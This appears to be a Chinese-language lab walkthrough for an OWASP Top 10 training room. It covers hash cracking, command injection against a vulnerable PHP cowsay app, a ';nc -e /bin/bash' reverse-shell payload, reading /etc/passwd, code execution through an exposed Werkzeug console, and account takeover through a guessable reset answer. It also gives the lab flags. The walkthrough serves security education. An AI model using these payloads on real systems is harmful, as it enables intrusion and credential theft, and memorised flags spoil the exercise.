<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlite&gt; PRAGMA table_info(customers);</span><br><span class="line">0|cudtID|INT|1||1</span><br><span class="line">1|custName|TEXT|1||0</span><br><span class="line">2|creditCard|TEXT|0||0</span><br><span class="line">3|password|TEXT|1||0</span><br><span class="line"></span><br><span class="line">sqlite&gt; SELECT * FROM customers;</span><br><span class="line">0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99</span><br><span class="line">1|John Walters|4671 5376 3366 8125|fef08f333cc53594c8097eba1f35726a</span><br><span class="line">2|Lena Abdul|4353 4722 6349 6685|b55ab2470f160c331a99b8d8a1946b19</span><br><span class="line">3|Andrew Miller|4059 8824 0198 5596|bc7b657bd56e4386e3397ca86e378f70</span><br><span class="line">4|Keith Wayman|4972 1604 3381 8885|12e7a36c0710571b3d827992f4cfe679</span><br><span class="line">5|Annett Scholz|5400 1617 6508 1166|e2795fc96af3f4d6288906a90a52a47f</span><br></pre></td></tr></table></figure></div>

<p>从上述的表信息中我们可以看到此表共有四列：<code>custID</code>、<code>custName</code>、<code>creditCard</code>、<code>password</code>；我们最终转储的结果和表中的列是匹配的，例如转储结果的第一行：</p>
<p><code>0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99</code></p>
<p>根据第一行转储结果，我们可以获取到以下信息：</p>
<blockquote>
<p>custID (0)、custName (Joy Paulson)、creditCard (4916 9012 2231 7905)、password的哈希值 (5f4dcc3b5aa765d61d8327deb882cf99)</p>
</blockquote>
<p>tips：在下一小节中，我们将研究如何破解从数据库的表中转储得到的密码哈希值。</p>
<h2 id="加密机制失效-材料二"><a href="#加密机制失效-材料二" class="headerlink" title="加密机制失效(材料二)"></a>加密机制失效(材料二)</h2><p>在上一个小节中，我们了解了如何查询 SQLite 数据库中的敏感数据，并且找到了一些密码哈希值(每个用户都有一个)。 在本小节中，我们将简要介绍如何破解这些密码哈希值。</p>
<p>在哈希破解方面，Kali 预装了各种工具——如果你知道如何使用这些工具，请随意使用即可。</p>
<p>在本小节中我们将使用以下在线工具进行hash破解工作：<a class="link"   href="https://crackstation.net/" >Crackstation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p>Crackstation网站非常擅长破解弱密码的哈希值，而对于更复杂的哈希，我们则需要使用其他工具来进行破解； 本小节例子中的所有可破解的密码哈希值都是弱密码的 MD5 哈希值，所以我们直接使用Crackstation在线破解即可。</p>
<p>当我们导航到Crackstation网站时，我们会看到以下界面：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221203225245851-1706333741994-4.png"
                      alt="image-20221203225245851"
                ></p>
<p>粘贴我们在上一小节中找到的 Joy Paulson 的密码哈希值(<code>5f4dcc3b5aa765d61d8327deb882cf99</code>) ，勾选验证码，然后点击“破解哈希”按钮即可：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221203225511295-1706333741994-5.png"
                      alt="image-20221203225511295"
                ></p>
<p>我们看到哈希值被成功破解，目标用户的密码是“password”！</p>
<p>注：Crackstation网站在破解hash时，将使用很大的字典进行工作，如果哈希值所对应的密码不在该网站所使用的字典中，那么Crackstation将无法破解该哈希值。</p>
<h2 id="加密机制失效-操作实践"><a href="#加密机制失效-操作实践" class="headerlink" title="加密机制失效(操作实践)"></a>加密机制失效(操作实践)</h2><p>现在是时候将我们所学到的知识付诸实践了，对于本小节的实验，我们需要测试URL<code>http://MACHINE_IP:81/</code>所对应的Web应用程序。</p>
<h3 id="答题-1"><a href="#答题-1" class="headerlink" title="答题"></a>答题</h3><p>部署目标机器，使用攻击机的浏览器访问<code>http://MACHINE_IP:81/</code>( 10.10.206.41:81)，然后查看login页面的源代码，我们看到作者留下了一些评论，告诉我们<code>/assets</code>网站目录下有一个数据库文件：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109213001357.png"
                      alt="image-20240109213001357"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109213051724.png"
                      alt="image-20240109213051724"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109213136459.png"
                      alt="image-20240109213136459"
                ></p>
<p>我们继续通过浏览器的url地址栏导航到目标站点的<code>/assets</code>页面，就能找到相关的数据库文件<code>webapp.db</code>(点击该文件即可将其下载到攻击机上)：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109213242810.png"
                      alt="image-20240109213242810"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109213443018.png"
                      alt="image-20240109213443018"
                ></p>
<p>通过浏览器下载好数据库文件之后，我们就可以在攻击机终端上使用命令<code>ls</code>和<code>file webapp.db</code>(验证所下载的文件是否为数据库文件)：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109213604353.png"
                      alt="image-20240109213604353"
                ></p>
<p>继续在攻击机终端输入命令<code>sqlitebrowser webapp.db</code>以便使用可视化客户端来打开数据库文件，然后我们就能直观地查看该数据库的用户表中的敏感信息：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109213707957.png"
                      alt="image-20240109213707957"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109213817221.png"
                      alt="image-20240109213817221"
                ></p>
<blockquote>
<p>在用户表中，admin用户所对应的密码hash值为：6eea9b7ef19179a06954edd0f6c05ceb</p>
</blockquote>
<p>接下来，我们可以使用以下网站进行在线hash破解操作：</p>
<ul>
<li><p><a class="link"   href="https://crackstation.net/" >https://crackstation.net/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
<li><p><a class="link"   href="https://hashes.com/en/decrypt/hash" >https://hashes.com/en/decrypt/hash <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109213926619.png"
                      alt="image-20240109213926619"
                ></p>
<blockquote>
<p>经过hash破解得到admin的密码为：qwertyuiop</p>
</blockquote>
<p>最后，使用刚才经过hash破解所得到的明文密码信息以admin用户身份登录目标站点，一旦登录成功即可看到flag内容：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109214014730.png"
                      alt="image-20240109214014730"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109214041459.png"
                      alt="image-20240109214041459"
                ></p>
<blockquote>
<p>我们得到的flag为：THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl} 。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109214228085.png"
                      alt="image-20240109214228085"
                ></p>
<h2 id="TOP3-注入"><a href="#TOP3-注入" class="headerlink" title="[TOP3]注入"></a>[TOP3]注入</h2><p>注入漏洞在当今的Web应用中非常常见，出现这些漏洞是因为Web应用程序将用户所控制的输入数据解释为实际的命令或参数；注入攻击取决于当前Web应用程序正在使用的技术以及这些技术会如何解释用户所输入的数据，一些常见的例子包括：</p>
<ul>
<li>SQL注入：当用户控制的输入数据能够被传递为后端的SQL查询时，就会发生SQL注入；通过利用该漏洞，攻击者可以传入SQL查询语句来操纵针对目标数据库的查询行为(访问、修改、删除数据库中的信息)并获取到相关的查询结果(例如个人详细信息、用户登录凭据等)。</li>
<li>命令注入：当用户的输入能够被传递为系统命令时，就会发生命令注入；通过利用该漏洞，攻击者能够在Web应用程序的服务器上执行任意系统命令，从而允许他们访问用户的计算机系统。</li>
</ul>
<p>如果攻击者能够成功地传递一些会被Web应用程序所解释的输入数据，他们将能够实现以下攻击目的：</p>
<ul>
<li>构造恶意的SQL查询语句并执行SQL注入攻击，从而访问、修改和删除数据库中的数据信息；这将允许攻击者窃取数据库中的个人详细信息、用户登录凭据等敏感信息。</li>
<li>构造恶意的系统命令并执行命令注入攻击，从而在目标服务器上执行任意系统命令；这将允许攻击者访问”服务器用户所对应的权限级别下”的系统文件，然后攻击者就能够窃取存储在系统中的敏感数据，并能对与”执行恶意命令的受害服务器”相连接的其他网络基础设施发起更多攻击尝试。</li>
</ul>
<p>针对注入攻击的主要防御措施是确保用户所控制的输入数据不会被解释为数据库查询语句或者有效的系统命令，有几种不同的方法可以做到这一点：</p>
<ul>
<li>使用允许列表(白名单)：当用户提供的输入被发送到服务器时，此输入将会与安全输入或安全字符列表进行比较；如果用户所提供的输入数据被标记为安全的，那么它将被允许通过并由服务器进行正常处理，否则，用户所提供的输入数据将被拒绝通过，并且应用程序会抛出错误提示。</li>
<li>过滤用户所输入的数据：如果用户所提供的输入中包含某些危险字符，那么Web应用程序会先将这些危险字符清除，然后再继续让服务器进行处理。</li>
</ul>
<p>危险字符或危险输入可以被归类为任何可能改变基础数据处理方式的外部输入，除了手动构造允许列表以及过滤用户输入数据之外，还存在各种函数库可以帮助我们执行注入防御操作。</p>
<h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p><strong>概念介绍</strong></p>
<p>当Web应用程序中的服务器端代码(例如PHP)调用那些可直接与服务器控制台交互的函数时，就可能会发生命令注入；这是一个Web漏洞，该漏洞将允许攻击者利用其所构造的系统调用在服务器上任意执行操作系统命令。</p>
<p>命令注入漏洞能够为攻击者提供很多选择，比如简单地执行<code>whoami</code>命令或者简单地执行文件读取命令，攻击者所能做的更具危害性的事情就是利用命令注入漏洞来生成一个反向shell，并以此获得目标Web服务器运行时所对应的用户权限。</p>
<p>攻击者通过简单地执行<code>;nc -e /bin/bash</code>payload就可能获得目标Web服务器所具备的权限(注意：一些netcat命令的变体也可能不支持-e选项)，关于这方面，我们可以参考以下反向shell列表以及反向shell在线生成器：</p>
<blockquote>
<p><a class="link"   href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" >https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.revshells.com/" >https://www.revshells.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>一旦攻击者在Web服务器上获得立足点(初始访问权限)，他们就可以开始对目标操作系统进行常规的枚举操作，并能够尝试寻找可用于提权或者内网横向移动的方法。</p>
<p><strong>代码示例</strong></p>
<p>让我们考虑以下场景：MooCorp团队想要开发一个基于Web的应用程序，用于呈现可定制文本的cow ASCII艺术字体，在寻找可用于实现该应用程序效果的方法时，他们想到了Linux中的<code>cowsay</code>命令，因此，他们决定编写一些简单的代码，从操作系统的控制台调用<code>cowsay</code>命令并将相关内容发送回网站页面。</p>
<p>让我们看看MooCorp团队在开发Web应用程序时所使用的涉及<code>cowsay</code>命令的部分代码：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;mooing&quot;</span>])) &#123;</span><br><span class="line">        <span class="variable">$mooing</span> = <span class="variable">$_GET</span>[<span class="string">&quot;mooing&quot;</span>];</span><br><span class="line">        <span class="variable">$cow</span> = <span class="string">&#x27;default&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cow&quot;</span>]))</span><br><span class="line">            <span class="variable">$cow</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cow&quot;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="title function_ invoke__">passthru</span>(<span class="string">&quot;perl /usr/bin/cowsay -f <span class="subst">$cow</span> <span class="subst">$mooing</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>简而言之，上述代码片段将执行以下操作：</p>
<ol>
<li>检查是否设置了参数”mooing”，如果设置了，就可以用变量<code>$mooing</code>获取传递到输入字段中的内容；</li>
<li>检查是否设置了参数”cow” ，如果设置了，就可以用变量<code>$cow</code>获取通过参数传递的内容；</li>
<li>然后程序将执行函数<code>passthru(&quot;perl /usr/bin/cowsay -f $cow $mooing&quot;);</code>，passthru函数会在操作系统的控制台中执行命令并将输出结果发送回用户的浏览器；在代码中，我们可以看到，我们的完整命令是通过在给定的部分命令的末尾连接上<code>$cow</code>变量和<code>$mooing</code>变量而形成的。</li>
</ol>
<p>tips：如果你对<code>passthru()</code>函数感兴趣，可以参考PHP官网所提供的<a class="link"   href="https://www.php.net/manual/en/function.passthru.php" >相关文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>以了解有关该函数的更多信息。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240107204849107.png"
                      alt="image-20240107204849107"
                ></p>
<p><strong>利用命令注入漏洞</strong></p>
<p>现在我们知道了示例应用程序如何在幕后工作，接下来我们将利用被称为”inline commands-内联命令”的Bash特性来滥用owsay示例服务器并执行我们想要的任何任意命令。</p>
<p>Bash允许我们在命令中运行命令(“inline commands-内联命令”)，这在很多时候都很有用，而在我们的示例中，该特性将被用于在cowsay示例服务器中注入命令并使其执行。</p>
<p>要执行Bash内联命令，我们需要使用特定的格式——<code>$(your_command_here)</code>；如果控制台检测到了内联命令的存在，就会先执行内联命令，然后再将相关的执行结果作为外部命令的参数。如下图所示，我们可以将<code>whoami</code>命令作为<code>echo</code>命令的内联命令执行：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240107210010449.png"
                      alt="image-20240107210010449"
                ></p>
<p>回到我们在上文中所提及的cowsay示例服务器，如果我们向该Web应用程序发送内联命令，那么就会发生以下情况：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240107210251435.png"
                      alt="image-20240107210251435"
                ></p>
<p>tips: perl &#x2F;usr&#x2F;bin&#x2F;cowsay -f $cow $(mooing)</p>
<p>由于示例应用程序会接受我们所提供的任何输入，因此我们就可以尝试注入一个内联命令，该内联命令会被执行并且将继续用作owsay命令的参数；最终，我们将能够注入任意内联命令并可得到命令的执行结果。</p>
<p>我们可以尝试执行以下Linux命令：</p>
<ul>
<li><code>whoami</code></li>
<li><code>id</code></li>
<li><code>ifconfig/ip addr</code></li>
<li><code>uname -a</code></li>
<li><code>ps -ef</code></li>
<li><code>ls</code></li>
<li><code>ls -la</code></li>
<li><code>cat /etc/passwd</code></li>
<li><code>cat /etc/os-release</code></li>
</ul>
<h3 id="答题-2"><a href="#答题-2" class="headerlink" title="答题"></a>答题</h3><p>部署目标虚拟机，并使用攻击机的浏览器导航到<code>http://MACHINE_IP:82/</code>(10.10.206.41:82)页面以尝试利用cowsay示例服务器。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109214427259.png"
                      alt="image-20240109214427259"
                ></p>
<p>在Cowsay Online输入框中输入$(ls)以查看网站根目录下的文件：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109222305121.png"
                      alt="image-20240109222305121"
                ></p>
<blockquote>
<p>可疑的文本文件为：drpepper.txt</p>
</blockquote>
<p>在Cowsay Online输入框中输入$(cat &#x2F;etc&#x2F;passwd)以列出用户：</p>
<p>tip：按ctrl+f键可检索当前页面。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109220341909.png"
                      alt="image-20240109220341909"
                ></p>
<blockquote>
<p>发现没有非 root&#x2F;非服务&#x2F;非守护程序用户（标准用户）。</p>
<p>此处的提示为sbin，它是系统二进制文件的缩写，sbin是为系统管理员设计的，标准用户不应该访问它；所以看到&#x2F;sbin&#x2F;nologin则说明不是标准用户。 </p>
</blockquote>
<p>在Cowsay Online输入框中输入$(whoami)以查看当前应用程序以什么用户身份运行：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109220638316.png"
                      alt="image-20240109220638316"
                ></p>
<p>继续使用$(cat &#x2F;etc&#x2F;passwd)列出用户并查看当前用户的shell设置：</p>
<p>tip：按ctrl+f键可检索当前页面。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109221008958.png"
                      alt="image-20240109221008958"
                ></p>
<blockquote>
<p>当前应用程序以什么用户身份运行：apache</p>
<p>当前用户的shell设置为：&#x2F;sbin&#x2F;nologin</p>
</blockquote>
<p>在Cowsay Online输入框中输入$(cat &#x2F;etc&#x2F;os-release)以查看操作系统版本：</p>
<p>tips：也可以使用$(cat &#x2F;etc&#x2F;alpine-release)</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109221257109.png"
                      alt="image-20240109221257109"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109221533079.png"
                      alt="image-20240109221533079"
                ></p>
<blockquote>
<p>运行当前应用程序的操作系统的版本为：3.16.0 </p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109221558880.png"
                      alt="image-20240109221558880"
                ></p>
<h2 id="TOP4-不安全的设计"><a href="#TOP4-不安全的设计" class="headerlink" title="[TOP4]不安全的设计"></a>[TOP4]不安全的设计</h2><p><strong>概念介绍</strong></p>
<p>“不安全的设计”是指应用程序架构本身所固有的漏洞，它们不是关于错误实现或错误配置的漏洞，而是整个应用程序(或其中一部分)背后的设计思想从一开始就存在缺陷。在大多数情况下，这类漏洞是因为在应用程序的规划阶段进行了不适当的威胁建模而出现的，并会一直影响到最终发布的应用程序。有时候，开发人员还会围绕代码添加一些“快捷功能”以使得他们测试起来更加容易，而这也可能会引入”不安全的设计”漏洞。例如，开发人员可能会在程序开发阶段选择禁用OTP验证，以便快速测试应用程序的其余部分，而无需在每次登录时手动输入代码，但如果开发人员在将该应用程序发布到生产环境时忘记重新启用OTP验证，那么就会导致出现”不安全的设计”漏洞。</p>
<p><strong>不安全的密码重置机制</strong></p>
<p>Instagram曾经出现过此类<a class="link"   href="https://thezerohack.com/hack-any-instagram" >不安全设计漏洞 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，它允许向用户的手机发送带有6位验证代码的短信，以便重置用户所忘记的密码；如果攻击者想要借助此机制访问受害者的帐户，那么攻击者就可能需要尝试暴力破解短信中的6位验证码，而这通常不可能直接实现(因为Instagram实施了速率限制措施，在250次验证尝试后，用户就会被阻止)。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240108185718735.png"
                      alt="image-20240108185718735"
                ></p>
<p>然而，我们发现Instagram所做的速率限制措施仅适用于来自同一个IP地址的验证尝试，如果攻击者使用多个不同的IP地址来发送请求进行，那么就可以突破250次验证尝试。对于6位验证码，有一百万种可能的组合，因此攻击者就需要使用1000000&#x2F;250 &#x3D; 4000 个 IP才能覆盖所有可能的验证码；这听起来攻击者似乎需要拥有大量的IP，但如果使用云服务则可以轻松地以相对较小的成本获取很多IP来使用，从而使得相关的攻击方式变得更加具有可行性。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240108190808099.png"
                      alt="image-20240108190808099"
                ></p>
<p>注意：出现上述漏洞的原因在于——应用程序设计者认为没有用户能够使用数千个 IP 地址发出并发请求来尝试暴力破解数字验证码。</p>
<p>由于”不安全的设计”漏洞是在应用程序开发过程的早期阶段被引入的，因此解决此类漏洞通常需要开发者从头开始重建应用程序的易受攻击部分，而这通常比解决任何其他简单的代码相关漏洞更难做到。避免出现此类漏洞的最佳方法是在开发生命周期的早期阶段执行威胁建模措施。</p>
<h3 id="答题-3"><a href="#答题-3" class="headerlink" title="答题"></a>答题</h3><p>部署目标虚拟机，使用攻击机的浏览器导航到<code>http://MACHINE_IP:85</code>(10.10.206.41:85)页面，我们已知该应用程序的密码重置机制存在设计缺陷 ，接下来我们将找出具体的“不安全的设计”并尝试利用该漏洞(针对<code>joseph</code>用户帐户进行密码重置)。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109222416090.png"
                      alt="image-20240109222416090"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109222458473.png"
                      alt="image-20240109222458473"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109222552902.png"
                      alt="image-20240109222552902"
                ></p>
<p>通过对第二个密码保护问题进行猜测(Red, Orange, Yellow, Green, Blue, Indigo, 和Violet)，我们发现<code>green</code>是正确的密码保护答案，从而成功地重置了密码：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109222801040.png"
                      alt="image-20240109222801040"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109222907400.png"
                      alt="image-20240109222907400"
                ></p>
<blockquote>
<p>lzwoWbRaAjLKUB</p>
</blockquote>
<p>我们使用重置得到的密码登录<code>joseph</code>用户帐户，然后查看flag内容即可：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109223038838.png"
                      alt="image-20240109223038838"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109223140492.png"
                      alt="image-20240109223140492"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109223151130.png"
                      alt="image-20240109223151130"
                ></p>
<blockquote>
<p>flag的内容为：THM{Not_3ven_c4tz_c0uld_sav3_U!} 。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109223246705.png"
                      alt="image-20240109223246705"
                ></p>
<h2 id="TOP5-安全配置错误"><a href="#TOP5-安全配置错误" class="headerlink" title="[TOP5]安全配置错误"></a>[TOP5]安全配置错误</h2><p><strong>概念介绍</strong></p>
<p>安全配置错误与其他Top 10漏洞不同，因为它们发生在本可以适当配置但却没有进行很好地配置的情况下，即使我们已经下载了最新的软件，但是不良的配置也可能使得我们已安装的程序容易受到攻击。</p>
<p>安全配置错误包括：</p>
<ul>
<li>云服务的权限配置不当，例如S3存储桶；</li>
<li>启用了不必要的功能，例如某些服务、页面、帐户或权限；</li>
<li>使用了未更改默认密码的默认帐户；</li>
<li>报错信息过于详细，从而使得攻击者找到了关于系统的更多信息；</li>
<li>没有使用 <a class="link"   href="https://owasp.org/www-project-secure-headers/" >HTTP 安全标头 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</li>
</ul>
<p>此漏洞通常还会导致更多的漏洞出现，例如允许攻击者通过使用默认凭据来访问敏感数据、导致在admin页面上发生XML外部实体(XXE)注入或命令注入。</p>
<p>关于安全配置错误的详细信息，请参考以下链接页面：<a class="link"   href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" >https://owasp.org/Top10/A05_2021-Security_Misconfiguration/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>调试接口泄露</strong></p>
<p>软件产品中的调试功能的暴露是一个常见的安全配置错误。在编程框架中通常会提供调试功能，以便开发人员访问一些高级功能，这对于在开发过程中调试应用程序很有用。如果开发人员在发布应用程序之前忘记禁用其中一些调试功能，那么攻击者就可以尝试滥用应用程序中的部分调试功能。</p>
<p>据称，在<a class="link"   href="https://labs.detectify.com/2015/10/02/how-patreon-got-hacked-publicly-exposed-werkzeug-debugger/" >2015年Patreon遭到网络攻击 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>时，黑客就利用了此类漏洞。在Patreon遭到网络攻击的五天前，一名安全人员向Patreon报告说——他发现了Werkzeug控制台的开放调试接口。Werkzeug是基于Python的Web应用程序中的重要组件，它能为Web服务器提供执行Python代码的接口；Werkzeug包含了一个调试控制台，在调试接口泄露的情况下，用户可以直接通过URL中的<code>/console</code>路径来访问该控制台，或者当应用程序引发异常时，该控制台也会呈现给用户。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240108194303246.png"
                      alt="image-20240108194303246"
                ></p>
<h3 id="答题-4"><a href="#答题-4" class="headerlink" title="答题"></a>答题</h3><p>部署目标虚拟机，使用攻击机的浏览器导航到<code>http://MACHINE_IP:86</code>(10.10.206.41:86)并尝试利用安全配置错误来读取应用程序的源代码。</p>
<p>我们可以使用浏览器访问<code>http://MACHINE_IP:86/console</code>页面以验证Werkzeug控制台是否泄露。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109223536803.png"
                      alt="image-20240109223536803"
                ></p>
<p>使用Werkzeug控制台运行以下Python代码，从而尝试在目标服务器上执行<code>ls -l</code>命令：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os; <span class="built_in">print</span>(os.popen(<span class="string">&quot;ls -l&quot;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="comment">#这段代码使用Python的`os`模块执行了一个命令，具体而言，运行的是`ls -l`命令，然后打印该命令的输出结果。</span></span><br><span class="line"><span class="comment">#`os.popen()`函数被用于执行命令，`read()`方法被用于读取命令的输出结果。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#具体解释如下：</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1. `import os;` 导入Python的`os`模块。</span></span><br><span class="line"><span class="comment">#2. `os.popen(&quot;ls -l&quot;)` 执行命令，即`ls -l`，这个命令用于列出当前目录的详细信息。</span></span><br><span class="line"><span class="comment">#3. `.read()` 方法用于读取`ls -l`命令的输出。</span></span><br><span class="line"><span class="comment">#4. `print()` 函数用于将输出结果打印到控制台。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#此段代码的效果类似于在终端中运行`ls -l`命令，用于显示当前目录下文件和文件夹的详细信息；请注意，具体的输出内容将依赖于代码运行时所在的目录，如果你希望运行其他命令或者在不同目录下执行`ls -l`，你可以相应地更改`os.popen(&quot;ls -l&quot;)`中的命令。</span></span><br></pre></td></tr></table></figure></div>

<p>我们可以看到，当前目录中的数据库文件名是什么？</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109224054293.png"
                      alt="image-20240109224054293"
                ></p>
<blockquote>
<p>当前目录中的数据库文件名为：todo.db</p>
</blockquote>
<p>修改我们刚才所使用的代码，以尝试读取<code>app.py</code>文件的内容，该文件包含了应用程序的源代码，我们可以看到源代码中<code>secret_flag</code>变量的值是？</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os; <span class="built_in">print</span>(os.popen(<span class="string">&quot;cat app.py&quot;</span>).read())</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109224310586.png"
                      alt="image-20240109224310586"
                ></p>
<blockquote>
<p>源代码中secret_flag变量的值是：THM{Just_a_tiny_misconfiguration} 。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240109224342647.png"
                      alt="image-20240109224342647"
                ></p>
<h2 id="TOP6-自带缺陷和过时的组件"><a href="#TOP6-自带缺陷和过时的组件" class="headerlink" title="[TOP6]自带缺陷和过时的组件"></a>[TOP6]自带缺陷和过时的组件</h2><p>有时候，我们可能会发现我们正在进行渗透测试的公司正在使用具有众所周知的、已公开的漏洞的应用程序。</p>
<p>例如，假设有一家公司已经几年没有更新他们的WordPress版本，通过使用诸如WPScan之类的工具进行扫描，我们发现了它是4.6版本的WordPress，经过调查我们还会发现WordPress 4.6版本容易受到未经身份验证的远程代码执行(RCE)漏洞攻击，而且我们还能在漏洞利用数据库<strong>Exploit-db</strong>中找到<a class="link"   href="https://www.exploit-db.com/exploits/41962" >相关的漏洞exp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p>正如我们所能想到的那样，这将是一件非常具有破坏性的事情，在这种情况下攻击者只需要做很少的工作就能完成漏洞攻击，因为目标应用程序的相关漏洞已经众所周知，其他攻击者也可能已经利用过了该漏洞，所以，如果一家公司错过了他们所使用的应用程序的一次版本更新或者补丁更新，那么就可能会遭受到来自不法份子的网络攻击。</p>
<p>tips：在现实情况下，公司、企业往往很容易错过对应用程序的及时更新。</p>
<h2 id="自带缺陷和过时的组件-漏洞利用示例"><a href="#自带缺陷和过时的组件-漏洞利用示例" class="headerlink" title="自带缺陷和过时的组件(漏洞利用示例)"></a>自带缺陷和过时的组件(漏洞利用示例)</h2><p>如果目标应用程序具有已知漏洞，那么其实我们已经完成了大部分攻击工作，我们的主要任务就是找出目标软件的信息，并对其进行研究，直到找到相关的漏洞利用程序。</p>
<p>接下来，让我们通过一个Web应用程序示例来了解一下。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240108200505003.png"
                      alt="image-20240108200505003"
                ></p>
